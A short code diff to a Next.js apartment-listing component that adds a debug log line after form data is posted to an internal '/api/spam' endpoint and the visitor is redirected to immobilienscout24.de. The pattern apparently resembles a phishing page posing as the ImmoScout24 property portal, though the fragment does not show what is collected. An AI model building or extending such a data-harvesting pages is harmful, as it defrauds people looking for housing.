@@ -44,6 +44,7 @@ export default function Wohnungen() {
       console.log("aici", process.env.NEXT_PUBLIC_URL);
       
       await axios.post(`${process.env.NEXT_PUBLIC_URL}/api/spam`, data);
+      console.log("a trimes!!");
       router.replace('https://www.immobilienscout24.de/');
     } catch(err) {
       console.log(err);
